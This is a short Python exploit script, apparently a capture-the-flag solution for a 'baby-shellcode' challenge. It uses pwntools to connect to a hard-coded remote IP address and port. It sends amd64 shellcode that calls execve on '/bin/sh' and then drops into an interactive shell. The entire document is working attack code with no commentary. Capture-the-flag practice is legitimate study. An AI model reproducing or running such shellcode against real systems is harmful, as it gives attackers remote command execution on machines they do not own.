#!/bin/python
from pwn import *
# exe = ELF('./baby-shellcode')
#
p = remote('34.28.147.7', 5000)

# context.terminal = ['foot']
#
shellcode = asm('''
                mov rdi, 29400045130965551 
                push rdi 
                mov rdi, rsp 
                xor rsi, rsi 
                xor rdx, rdx
                mov rax, 0x3b
                syscall


                ''', arch='amd64', os='linux')


p.sendline(shellcode)
p.interactive()
